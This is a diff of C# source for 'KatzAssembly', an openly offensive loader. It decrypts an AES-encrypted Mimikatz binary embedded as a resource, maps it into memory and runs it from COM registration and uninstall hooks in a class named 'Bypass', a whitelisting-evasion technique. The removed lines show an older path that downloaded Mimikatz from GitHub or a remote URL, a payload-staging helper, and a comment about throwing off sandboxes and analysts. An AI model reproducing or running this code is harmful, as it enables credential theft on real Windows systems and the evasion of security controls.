@@ -1,59 +1,23 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.EnterpriseServices;
 using System.IO;
-using System.IO.Compression;
-using System.Linq;
-using System.Net;
 using System.Runtime.InteropServices;
 using System.Security;
 using System.Security.Cryptography;
-using System.Text;
-using System.Threading;
 using System.Threading.Tasks;
 
 namespace KatzAssembly
 {
 
-    public class Program
-    {
-        public static void Main()
-        {
-            Console.WriteLine("Hello From Main...I Don't Do Anything");
-            //Add any behaviour here to throw off sandbox execution/analysts :)
-
-            /*
-             try
-             {
-                 Katz.Exec();
-             }
-             catch (SecurityException ex)
-             {
-                 Console.WriteLine(ex.Message);
-                 Console.ReadLine();
-             }
-             */
-
-
-            byte[] b = Misc.FileToByteArray(@"e:\Users\RODCHENKO\Documents\GitHub\mimikatz\mimikatz.zip");
-            byte[] e = Misc.Encrypt(b, "[!~=passw0rd=~!]");
-            string f = System.Convert.ToBase64String(e);
-            File.WriteAllText(@"e:\temp\WB\mimikatz_trunk.zip.enc.b64", f);
-            Console.ReadLine();
-        }
-
-    }
-
     public class Bypass : ServicedComponent
     {
-        public Bypass() { Console.WriteLine("I am a basic COM Object"); }
 
         [ComRegisterFunction] //This executes if registration is successful
         public static void RegisterClass(string key)
         {
             try
             {
-                Katz.ExecInternal();
+                Katz.Exec();
             }
             catch (SecurityException ex)
             {
@@ -67,7 +31,7 @@ namespace KatzAssembly
         {
             try
             {
-                Katz.ExecInternal();
+                Katz.Exec();
             }
             catch (SecurityException ex)
             {
@@ -88,7 +52,7 @@ namespace KatzAssembly
             Console.WriteLine("Hello There From Uninstall");
             try
             {
-                Katz.ExecInternal();
+                Katz.Exec();
             }
             catch (SecurityException ex)
             {
@@ -102,65 +66,21 @@ namespace KatzAssembly
 
     public static class Katz
     {
-
-        public static void ExecInternal()
+        public static void Exec()
         {
-            Exec(false);
-        }
-
-        public static void Exec(bool UseNet)
-        {
+            Console.WriteLine("Ready for unpack and execute");
             byte[] unpacked = null;
             try
             {
-
-                byte[] latestMimikatz;
-
-                if (UseNet)
+                if (IntPtr.Size == 8 ) //x64 Unpack And Execute
                 {
-                    //latestMimikatz = null;
-                    ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls;
-                    latestMimikatz = new System.Net.WebClient().DownloadData("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180616/mimikatz_trunk.zip");
+                    Console.WriteLine("x64 !! Gocha");
+                    unpacked = Misc.Decrypt(Properties.Resources.x64mimikatz);
                 }
-                else
+                else if (IntPtr.Size == 4)
                 {
-
-                    latestMimikatz = Misc.Decrypt(Convert.FromBase64String(Misc.newKatz()), "[!~=passw0rd=~!]"); //Yes, this is a bad idea. 
-                                                                                                                 //Use Misc Class to encrypt your own files
-                                                                                                                 //File.WriteAllBytes(@"c:\temp\WB\Katz.zip", latestMimikatz);
-                                                                                                                 //byte[] latestMimikatz = File.ReadAllBytes(@"c:\temp\WB\mimikatz_trunk.zip");
-                                                                                                                 //byte[] latestMimikatzenc = Misc.Encrypt(latestMimikatz, "password");
-                                                                                                                 //string base64latestMimiEnc = Convert.ToBase64String(latestMimikatzenc);
-                                                                                                                 //File.WriteAllText(@"c:\temp\WB\base64latestMimiEnc.txt", base64latestMimiEnc);
-                                                                                                                 //File.WriteAllBytes(@"c:\temp\WB\latestMimiEnc.txt", latestMimikatzenc);
-                }
-
-                Stream data = new MemoryStream(latestMimikatz); //The original data
-                Stream unzippedEntryStream;  //Unzipped data from a file in the archive
-                ZipArchive archive = new ZipArchive(data);
-
-                Console.WriteLine("archive unpacked");
-
-                foreach (ZipArchiveEntry entry in archive.Entries)
-                {
-                    Console.WriteLine(entry.FullName);
-                    if (IntPtr.Size == 8 && entry.FullName == @"x64/mimikatz.exe") //x64 Unpack And Execute
-                    {
-                        //x64 Unpack And Execute
-                        Console.WriteLine(entry.FullName + " !! Gocha");
-                        unzippedEntryStream = entry.Open(); // .Open will return a stream
-                        unpacked = Misc.ReadFully(unzippedEntryStream);
-
-                    }
-                    else if (IntPtr.Size == 4 && entry.FullName == @"Win32/mimikatz.exe")
-                    {
-                        //x86 Unpack And Execute
-                        Console.WriteLine(entry.FullName + " !! Gocha");
-                        unzippedEntryStream = entry.Open(); // .Open will return a stream
-                        unpacked = Misc.ReadFully(unzippedEntryStream);
-
-                    }
-
+                    Console.WriteLine("x86 !! Gocha");
+                    unpacked = Misc.Decrypt(Properties.Resources.Win32mimikatz);
                 }
 
             }
@@ -177,7 +97,6 @@ namespace KatzAssembly
             //Console.ReadLine();
             PELoader pe = new PELoader(unpacked);
 
-            //MessageBox.Show("peloader");
 
             IntPtr codebase = IntPtr.Zero;
 
@@ -312,10 +231,6 @@ namespace KatzAssembly
                 oa2 = Marshal.ReadInt32(IntPtr.Add(oa1, 16));
             }
 
-
-
-            //Get And Display Each DLL To Load
-
             IntPtr threadStart;
             IntPtr hThread;
             uint cthread = NativeDeclarations.GetCurrentThreadId();
@@ -352,24 +267,8 @@ namespace KatzAssembly
                     Console.WriteLine("Executing Mimikatz");
                     threadStart = IntPtr.Add(codebase, (int)pe.OptionalHeader32.AddressOfEntryPoint);
                     hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
-
                     NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
-                    
 
-                    //NativeDeclarations.WaitForSingleObject(hThread, 0x0);
-                    /*
-                    IntPtr[] ptrs = new IntPtr[1];
-                    ptrs[0] = hThread;
-                    NativeDeclarations.MsgWaitForMultipleObjectsEx(1,ptrs,0xFFFFFFFF, 0x04FF, 0x0001);
-                    uint exitCode = 259;
-                    while (exitCode == 259) 
-                    {
-                        System.Threading.Thread.Sleep(1000);
-                        NativeDeclarations.GetExitCodeThread(hThread, out exitCode);
-                    }
-                    */
-
-                    //Console.WriteLine("Thread Complete");
                 }
                 else
                 {
@@ -390,7 +289,6 @@ namespace KatzAssembly
                         {
                             IntPtr dllFuncNamePTR = (IntPtr.Add(codebase, Marshal.ReadInt32(a2)));
                             string DllFuncName = Marshal.PtrToStringAnsi(IntPtr.Add(dllFuncNamePTR, 2));
-                            //Console.WriteLine("Function {0}", DllFuncName);
                             IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                             Marshal.WriteInt64(a2, (long)funcAddy);
                             a2 = IntPtr.Add(a2, 8);
@@ -399,31 +297,21 @@ namespace KatzAssembly
                         }
                         j++;
                     }
-                    //Transfer Control To OEP
                     Console.WriteLine("Executing Mimikatz");
                     threadStart = IntPtr.Add(codebase, (int)pe.OptionalHeader64.AddressOfEntryPoint);
                     hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                     NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
 
-                    //Console.WriteLine("Thread Complete");
                 }
             });
             t.Wait();
-            //Transfer Control To OEP
             t.Dispose();
             Console.WriteLine("Thread Complete");
             Console.ReadLine();
 
             NativeDeclarations.VirtualFree(codebase, 0, NativeDeclarations.FreeType.Release);
 
-            //unpacked = unpacked.Select(n => Convert.ToByte(0)).ToArray();
-            //Byte[] array = new Byte[pe.RawBytes.Length];
-            //Array.Clear(array, 0, array.Length);
-            //Marshal.Copy(array, 0, codebase, array.Length);
-            
-            //pe = null;
-            //GC.Collect();
-            //GC.WaitForFullGCComplete();
+
             Console.WriteLine("Free memory");
             Console.ReadLine();
 
@@ -799,35 +687,6 @@ namespace KatzAssembly
     {
         
         #region pinvoke flags
-        [Flags]
-        public enum AllocationType
-        {
-            Commit = 0x1000,
-            Reserve = 0x2000,
-            Decommit = 0x4000,
-            Release = 0x8000,
-            Reset = 0x80000,
-            Physical = 0x400000,
-            TopDown = 0x100000,
-            WriteWatch = 0x200000,
-            LargePages = 0x20000000
-        }
-
-        [Flags]
-        public enum MemoryProtection
-        {
-            Execute = 0x10,
-            ExecuteRead = 0x20,
-            ExecuteReadWrite = 0x40,
-            ExecuteWriteCopy = 0x80,
-            NoAccess = 0x01,
-            ReadOnly = 0x02,
-            ReadWrite = 0x04,
-            WriteCopy = 0x08,
-            GuardModifierflag = 0x100,
-            NoCacheModifierflag = 0x200,
-            WriteCombineModifierflag = 0x400
-        }
 
         [Flags]
         public enum FreeType
@@ -836,45 +695,7 @@ namespace KatzAssembly
             Release = 0x8000,
         }
         #endregion
-        #region pinvoke structs
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        struct STARTUPINFO
-        {
-            public Int32 cb;
-            public string lpReserved;
-            public string lpDesktop;
-            public string lpTitle;
-            public Int32 dwX;
-            public Int32 dwY;
-            public Int32 dwXSize;
-            public Int32 dwYSize;
-            public Int32 dwXCountChars;
-            public Int32 dwYCountChars;
-            public Int32 dwFillAttribute;
-            public Int32 dwFlags;
-            public Int16 wShowWindow;
-            public Int16 cbReserved2;
-            public IntPtr lpReserved2;
-            public IntPtr hStdInput;
-            public IntPtr hStdOutput;
-            public IntPtr hStdError;
-        }
-        [StructLayout(LayoutKind.Sequential)]
-        internal struct PROCESS_INFORMATION
-        {
-            public IntPtr hProcess;
-            public IntPtr hThread;
-            public int dwProcessId;
-            public int dwThreadId;
-        }
-        [StructLayout(LayoutKind.Sequential)]
-        public struct SECURITY_ATTRIBUTES
-        {
-            public int nLength;
-            public IntPtr lpSecurityDescriptor;
-            public int bInheritHandle;
-        }
-        #endregion
+
         
 
         public static uint MEM_COMMIT = 0x1000;
@@ -889,17 +710,12 @@ namespace KatzAssembly
             public uint SizeOfBlock;
         }
 
-        [DllImport("kernel32.dll")]
-        public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
 
         [DllImport("kernel32.dll")]
         public static extern uint GetCurrentThreadId();
 
         [DllImport("kernel32")]
         public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
-
-        [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
-        public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, FreeType dwFreeType);
 
         [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
         public static extern bool VirtualFree(IntPtr lpAddress, int dwSize, FreeType dwFreeType);
@@ -921,8 +737,6 @@ namespace KatzAssembly
           IntPtr lpThreadId
           );
 
-        [DllImport("user32")]
-        public static extern uint MsgWaitForMultipleObjectsEx(uint nCount, IntPtr[] pHandles, uint dwMilliseconds, uint dwWakeMask, uint dwFlags);
 
         [DllImport("kernel32")]
         public static extern UInt32 WaitForSingleObject(
@@ -930,120 +744,51 @@ namespace KatzAssembly
           IntPtr hHandle,
           UInt32 dwMilliseconds
           );
-
-        [StructLayout(LayoutKind.Sequential)]
-        public /*unsafe*/ struct IMAGE_IMPORT_DESCRIPTOR
-        {
-            public uint OriginalFirstThunk;
-            public uint TimeDateStamp;
-            public uint ForwarderChain;
-            public uint Name;
-            public uint FirstThunk;
-        }
-
-
+        
     }
 
     public class Misc
     {
-        //Change This!
-        private static readonly byte[] SALT = new byte[] { 0xcd, 0x2f, 0x56, 0x47, 0xeb, 0xc1, 0x29, 0xc6, 0x16, 0x3d, 0x35, 0xdd, 0x7b, 0x60, 0x0e, 0xaf };
-
-
-        public static void Stage(string fileName, string Key, string outFile)
+        private static byte[] PerformCryptography(ICryptoTransform cryptoTransform, byte[] data)
         {
-
-            byte[] raw = FileToByteArray(fileName);
-            byte[] file = Encrypt(raw, Key);
-
-            FileStream fileStream = File.Create(outFile);
-
-            fileStream.Write(file, 0, file.Length);//Write stream to temp file
-
-            Console.WriteLine("File Ready, Now Deliver Payload");
-
-        }
-
-        public static byte[] FileToByteArray(string _FileName)
-        {
-            byte[] _Buffer = null;
-            System.IO.FileStream _FileStream = new System.IO.FileStream(_FileName, System.IO.FileMode.Open, System.IO.FileAccess.Read);
-            System.IO.BinaryReader _BinaryReader = new System.IO.BinaryReader(_FileStream);
-            long _TotalBytes = new System.IO.FileInfo(_FileName).Length;
-            _Buffer = _BinaryReader.ReadBytes((Int32)_TotalBytes);
-            _FileStream.Close();
-            _FileStream.Dispose();
-            _BinaryReader.Close();
-            return _Buffer;
-        }
-
-        public static byte[] Encrypt(byte[] plain, string password)
-        {
-            MemoryStream memoryStream;
-            CryptoStream cryptoStream;
-            Rijndael rijndael = Rijndael.Create();
-            Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, SALT);
-            rijndael.Key = pdb.GetBytes(32);
-            rijndael.IV = pdb.GetBytes(16);
-            memoryStream = new MemoryStream();
-            cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write);
-            cryptoStream.Write(plain, 0, plain.Length);
-            cryptoStream.Close();
-            return memoryStream.ToArray();
-        }
-        public static byte[] Decrypt(byte[] cipher, string password)
-        {
-            MemoryStream memoryStream;
-            CryptoStream cryptoStream;
-            Rijndael rijndael = Rijndael.Create();
-            Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, SALT);
-            rijndael.Key = pdb.GetBytes(32);
-            rijndael.IV = pdb.GetBytes(16);
-            memoryStream = new MemoryStream();
-            cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
-            cryptoStream.Write(cipher, 0, cipher.Length);
-            cryptoStream.Close();
-            return memoryStream.ToArray();
-        }
-
-        public static byte[] ReadFully(Stream input) //Returns Byte Array From Stream 
-        {
-            byte[] buffer = new byte[16 * 1024];
-            using (MemoryStream ms = new MemoryStream())
+            using (var memoryStream = new MemoryStream())
             {
-                int read;
-                while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
+                using (var cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write))
                 {
-                    ms.Write(buffer, 0, read);
+                    cryptoStream.Write(data, 0, data.Length);
+                    cryptoStream.FlushFinalBlock();
+                    return memoryStream.ToArray();
                 }
-                return ms.ToArray();
             }
         }
 
+        static readonly byte[] myIV = new byte[] { 40, 58, 32, 174, 187, 91, 201, 68, 81, 201, 230, 98, 222, 237, 26, 145 };
+        static readonly byte[] myKey = new byte[] { 141, 46, 84, 223, 171, 106, 191, 231, 223, 254, 202, 22, 25, 216, 114, 211, 134, 201, 239, 179, 80, 64, 238, 106, 174, 7, 173, 31, 14, 142, 140, 179 };
 
-        public static string newKatz()
+
+        public static byte[] Encrypt(byte[] data)
         {
-            //string file;	
-            //StringBuilder sb = new StringBuilder();
+            Aes _algorithm = Aes.Create();
 
-            string resource_data = System.Text.Encoding.Default.GetString(Properties.Resources.mimikatz_trunk_zip_enc);
-            Console.WriteLine("Successfully extract B64 string");
-
-            /*WebClient client = new WebClient();
-            client.Proxy = null;
-
-            string DownloadedB64 = client.DownloadString("http://clickonce.gam.click/mimiOneClickDomain/mimikatz_trunk.zip.enc.b64");
-            WebClient myWebClient = new WebClient();
-            Console.WriteLine("Successfully Downloaded B64 string");
-
-            return DownloadedB64;*/
-            return resource_data;
-            /*
-			file = sb.ToString();
-			return file;
-            */
+            using (var encryptor = _algorithm.CreateEncryptor(myKey, myIV))
+            {
+                return PerformCryptography(encryptor, data);
+            }
 
         }
+
+        public static byte[] Decrypt(byte[] data)
+        {
+            Aes _algorithm = Aes.Create();
+            using (var decryptor = _algorithm.CreateDecryptor(myKey, myIV))
+            {
+                return PerformCryptography(decryptor, data);
+            }
+
+        }
+
+
+        
 
     }//End Misc Class	
 }
